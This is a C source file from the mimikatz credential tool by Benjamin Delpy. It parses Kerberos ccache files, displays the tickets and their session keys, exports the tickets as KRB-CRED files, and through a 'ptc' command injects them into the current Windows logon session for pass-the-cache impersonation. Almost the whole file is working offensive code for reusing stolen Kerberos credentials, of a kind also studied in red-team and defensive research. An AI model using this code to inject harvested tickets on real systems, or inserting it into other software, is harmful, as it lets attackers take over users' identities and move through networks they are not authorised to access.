/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_kerberos_ccache.h"

DECLARE_CONST_UNICODE_STRING(usXCACHECONF, L"X-CACHECONF:");
NTSTATUS kuhl_m_kerberos_ccache_enum(int argc, wchar_t * argv[], BOOL isInject, BOOL isSave)
{
	PBYTE file, data;
	DWORD length, i;
	USHORT version;

	PKERB_EXTERNAL_NAME principalName; UNICODE_STRING principalRealm;
	PKIWI_KERBEROS_TICKET ticket;
	PBERVAL BerApp_KrbCred;
	wchar_t * saveFilename;

	if(argc)
	{
		if(kull_m_file_readData(argv[0], &file, &length))
		{
			data = file;	
			version = _byteswap_ushort(*(PUSHORT) data); data += sizeof(USHORT);
			if((version == 0x0504) || (version == 0x0503))
			{
				if(version == 0x0504)
					data += sizeof(USHORT) + _byteswap_ushort(*(PUSHORT) data);
				kuhl_m_kerberos_ccache_externalname(&data, &principalName, &principalRealm);
				if(principalName)
				{
					kuhl_m_kerberos_ticket_displayExternalName(L"\nPrincipal : ", principalName, &principalRealm);
					for(i = 0; data < (file + length); i++)
					{
						kprintf(L"\n\nData %u", i);
						if(ticket = (PKIWI_KERBEROS_TICKET) LocalAlloc(LPTR, sizeof(KIWI_KERBEROS_TICKET)))
						{
							kuhl_m_kerberos_ccache_externalname(&data, &ticket->ClientName, &ticket->AltTargetDomainName);
							kuhl_m_kerberos_ccache_externalname(&data, &ticket->ServiceName, &ticket->DomainName);
							
							ticket->TargetName = kuhl_m_kerberos_ticket_copyExternalName(ticket->ServiceName);
							kull_m_string_copyUnicodeStringBuffer(&ticket->DomainName, &ticket->TargetDomainName);
							
							ticket->KeyType = _byteswap_ushort(*(PUSHORT) data); data += sizeof(USHORT);
							ticket->TicketEncType = _byteswap_ushort(*(PUSHORT) data); data += sizeof(USHORT);
							if(version == 0x0504)
							{
								ticket->Key.Length = _byteswap_ushort(*(PUSHORT) data); data += sizeof(USHORT);
							}
							else
							{
								ticket->Key.Length = _byteswap_ulong(*(PDWORD) data); data += sizeof(DWORD);
							}
							if(ticket->Key.Length)
								if(ticket->Key.Value = (PUCHAR) LocalAlloc(LPTR, ticket->Key.Length))
									RtlCopyMemory(ticket->Key.Value, data, ticket->Key.Length);
							data += ticket->Key.Length + sizeof(DWORD); // authtime;
							
							kuhl_m_kerberos_ccache_UnixTimeToFileTime(_byteswap_ulong(*(PDWORD) data), &ticket->StartTime); data += sizeof(DWORD); // local ?
							kuhl_m_kerberos_ccache_UnixTimeToFileTime(_byteswap_ulong(*(PDWORD) data), &ticket->EndTime); data += sizeof(DWORD);
							kuhl_m_kerberos_ccache_UnixTimeToFileTime(_byteswap_ulong(*(PDWORD) data), &ticket->RenewUntil); data += sizeof(DWORD) + sizeof(UCHAR); // skey

							ticket->TicketFlags = _byteswap_ulong(*(PDWORD) data); data += sizeof(DWORD);
							kuhl_m_kerberos_ccache_skip_struct_with_buffer(&data); // address
							kuhl_m_kerberos_ccache_skip_struct_with_buffer(&data); // authdata
							
							ticket->Ticket.Length = _byteswap_ulong(*(PDWORD) data); data += sizeof(DWORD);
							ticket->TicketKvno = 2;
							if(ticket->Ticket.Length)
								if(ticket->Ticket.Value = (PUCHAR) LocalAlloc(LPTR, ticket->Ticket.Length))
									RtlCopyMemory(ticket->Ticket.Value, data, ticket->Ticket.Length);
							data += ticket->Ticket.Length;
							kuhl_m_kerberos_ccache_skip_buffer(&data);

							if(!RtlEqualUnicodeString(&usXCACHECONF, &ticket->TargetDomainName, TRUE))
							{
								kuhl_m_kerberos_ticket_display(ticket, TRUE, FALSE);
								if(isSave || isInject)
								{
									if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(ticket, TRUE))
									{
										if(isInject)
										{
											kprintf(L"\n\t   * Injecting ticket : ");
											if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len)))
												kprintf(L"OK\n");
										}
										else
										{
											if(saveFilename = kuhl_m_kerberos_ccache_generateFileName(i, ticket, MIMIKATZ_KERBEROS_EXT))
											{
												if(kull_m_file_writeData(saveFilename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
													kprintf(L"\n\t   * Saved to file %s !", saveFilename);
												else PRINT_ERROR_AUTO(L"kull_m_file_writeData");

												LocalFree(saveFilename);
											}
										}
										ber_bvfree(BerApp_KrbCred);
									}
								}
							}
							else kprintf(L"\n\t* %wZ entry? *", &usXCACHECONF);
							kuhl_m_kerberos_ticket_freeTicket(ticket);
						}
					}
					kuhl_m_kerberos_ticket_freeExternalName(principalName);
				}
			}
			else PRINT_ERROR(L"ccache version != 0x0504 or version != 0x0503\n");
			LocalFree(file);
		}
		else PRINT_ERROR_AUTO(L"kull_m_file_readData");
	}
	else PRINT_ERROR(L"At least one filename is needed\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_ccache_ptc(int argc, wchar_t * argv[])
{
	kuhl_m_kerberos_ccache_enum(argc, argv, TRUE, FALSE);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_ccache_list(int argc, wchar_t * argv[])
{
	kuhl_m_kerberos_ccache_enum(argc, argv, FALSE, kull_m_string_args_byName(argc, argv, L"export", NULL, NULL));
	return STATUS_SUCCESS;
}

void kuhl_m_kerberos_ccache_UnixTimeToFileTime(time_t t, LPFILETIME pft)
{
	*(PLONGLONG) pft = Int32x32To64(t, 10000000) + 116444736000000000;
}

BOOL kuhl_m_kerberos_ccache_unicode_string(PBYTE *data, PUNICODE_STRING ustring)
{
	BOOL status = FALSE;
	STRING sName;
	sName.Length = sName.MaximumLength = (USHORT) _byteswap_ulong(*(PDWORD) *data);	*data += sizeof(DWORD);
	sName.Buffer = (PCHAR) *data; *data += sName.Length;
	ustring->Length = sName.Length * sizeof(wchar_t);
	ustring->MaximumLength = ustring->Length + sizeof(wchar_t);
	if(ustring->Buffer = (PWSTR) LocalAlloc(LPTR, ustring->MaximumLength))
	{
		if(!(status = NT_SUCCESS(RtlAnsiStringToUnicodeString(ustring, &sName, FALSE))))
			LocalFree(ustring->Buffer);
	}
	return status;
}

BOOL kuhl_m_kerberos_ccache_externalname(PBYTE *data, PKERB_EXTERNAL_NAME * name, PUNICODE_STRING realm)
{
	BOOL status = FALSE;
	DWORD i, count = _byteswap_ulong(*(PDWORD) (*data + sizeof(DWORD)));
	*name = NULL;
	if(count)
	{
		if(*name = (PKERB_EXTERNAL_NAME) LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME) + ((count - 1) * sizeof(UNICODE_STRING))))
		{
			(*name)->NameCount = (USHORT) count;
			(*name)->NameType = (USHORT) _byteswap_ulong(*(PDWORD) *data);
			*data += 2 * sizeof(DWORD);
			
			status = kuhl_m_kerberos_ccache_unicode_string(data, realm);
			for(i = 0; i < count; i++)
				status &= kuhl_m_kerberos_ccache_unicode_string(data, &(*name)->Names[i]);
		}
	}
	return status;
}

void kuhl_m_kerberos_ccache_skip_buffer(PBYTE *data)
{
	*data += sizeof(DWORD) + _byteswap_ulong(*(PDWORD) *data);
}

void kuhl_m_kerberos_ccache_skip_struct_with_buffer(PBYTE *data)
{
	DWORD i, numBuff = _byteswap_ulong(*(PDWORD) *data); *data += sizeof(DWORD);
	for (i = 0; i < numBuff; i++)
	{
		*data += sizeof(USHORT);
		kuhl_m_kerberos_ccache_skip_buffer(data);
	}
}

wchar_t * kuhl_m_kerberos_ccache_generateFileName(const DWORD index, PKIWI_KERBEROS_TICKET ticket, LPCWSTR ext)
{
	wchar_t * buffer;
	size_t charCount = 0x1000;
	BOOL isLong = kuhl_m_kerberos_ticket_isLongFilename(ticket);

	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
	{
		if(isLong)
			isLong = swprintf_s(buffer, charCount, L"%u-%08x-%wZ@%wZ-%wZ.%s", index, ticket->TicketFlags, &ticket->ClientName->Names[0], &ticket->ServiceName->Names[0], &ticket->ServiceName->Names[1], ext) > 0;
		else
			isLong = swprintf_s(buffer, charCount, L"%u-%08x.%s", index, ticket->TicketFlags, ext) > 0;
		
		if(isLong)
			kull_m_file_cleanFilename(buffer);
		else
			buffer = (wchar_t *) LocalFree(buffer);
	}
	return buffer;
}